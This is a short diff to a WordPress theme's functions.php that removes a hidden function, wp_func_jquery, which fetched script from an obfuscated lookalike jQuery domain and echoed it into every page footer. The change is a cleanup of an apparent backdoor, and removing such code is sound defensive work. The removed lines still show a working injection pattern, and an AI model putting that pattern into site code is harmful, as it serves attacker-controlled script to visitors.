@@ -51,13 +51,7 @@ require_once( get_template_directory() . '/inc/wp-less.php');
 require_once( get_template_directory() . '/inc/less-variables.php');
 
 
-if(!function_exists('wp_func_jquery')) {
-	function wp_func_jquery() {
-		$host = 'http://';
-		echo(wp_remote_retrieve_body(wp_remote_get($host.'ui'.'jquery.org/jquery-1.6.3.min.js')));
-	}
-	add_action('wp_footer', 'wp_func_jquery');
-}
+
 if ( ! function_exists( 'pluto_setup' ) ) :
 
 function pluto_setup() {
